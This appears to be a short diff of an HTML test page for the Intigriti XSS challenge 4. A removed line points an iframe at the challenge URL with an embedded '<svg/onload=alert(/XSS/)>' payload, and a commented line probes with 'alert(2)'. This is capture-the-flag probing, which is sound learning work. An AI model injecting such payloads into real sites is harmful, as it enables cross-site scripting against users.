@@ -6,18 +6,15 @@
     <script>
     //(location.search == "") ? true : location = location.pathname;
     var iframe = document.createElement("iframe");
-    //var id = location.hash.substr(1);
-    //var path = `/static/4/${id}.png`;
-    iframe.name = `helloworld`; 
-        iframe.src = `https://challenge.intigriti.io/static/4/1;25;<svg/onload=alert(/XSS/)>true<">;alert();/`
-    //iframe.src = `https://challenge.intigriti.io/static/4/challenge.png?q=alert(2)`;
-    iframe.height = `500`;
-    iframe.width = `500`;
-            iframe.frameborder = `500`
-    //iframe.onclick = function(e){
-    //  window.open(this.contentWindow.name, this.src);
-    //}
-    document.body.appendChild(iframe);
+        //var id = location.hash.substr(1);
+        //var path = `/static/4/${id}.png`;
+        iframe.name = `helloworld`; 
+            iframe.src = `https://challenge.intigriti.io/static/4/challenge.png?`
+        //iframe.src = `https://challenge.intigriti.io/static/4/challenge.png?q=alert(2)`;
+        //iframe.onclick = function(e){
+        //  window.open(this.contentWindow.name, this.src);
+        //}
+        document.body.appendChild(iframe);
   </script>
 </body>
 </html>
